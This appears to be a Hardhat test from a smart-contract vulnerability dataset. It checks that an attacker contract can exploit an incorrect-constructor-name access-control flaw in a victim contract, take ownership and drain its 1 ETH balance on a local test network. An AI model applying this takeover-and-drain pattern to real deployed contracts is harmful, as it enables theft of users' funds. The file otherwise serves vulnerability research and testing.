const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe('attack access_control/incorrect_constructor_name3.sol', function () {
    async function deployContracts() {
      const Missing = await ethers.getContractFactory('contracts/dataset/access_control/incorrect_constructor_name3.sol:Missing');
      const victim = await Missing.deploy();  
      await victim.waitForDeployment();
      const address = await victim.getAddress();

      const MissingAttacker = await ethers.getContractFactory('contracts/access_control/incorrect_constructor_name3_attack.sol:MissingAttacker');
      const attacker = await MissingAttacker.deploy(address);  
      await attacker.waitForDeployment();
      return {victim, attacker};
    }

    it('exploit access control vulnerability', async function () {
      const {victim, attacker} = await loadFixture(deployContracts);
      const victim_addr = await victim.getAddress();
      const attacker_addr = await attacker.getAddress();

      
      const [sig] = await ethers.getSigners();
      const amount = ethers.parseEther("1.0");
      const transactionHash = await sig.sendTransaction({
        to: victim_addr,
        value: amount,
      });
      
      const victimBalanceBefore = await ethers.provider.getBalance(victim_addr);
      expect(victimBalanceBefore).to.equal(amount);
      
      
      await expect(attacker.test()).to.be.reverted;
      
      await attacker.attack();
      
      const attackerBalanceBefore = await ethers.provider.getBalance(attacker_addr);
      await expect(attacker.test()).to.not.be.reverted;
      
      const attackerBalanceAfter = await ethers.provider.getBalance(await attacker.getAddress());
      expect(attackerBalanceAfter - attackerBalanceBefore).to.equal(amount);
      
      const victimBalanceAfter = await ethers.provider.getBalance(victim_addr);
      expect(victimBalanceAfter).to.equal(0);
    });
  });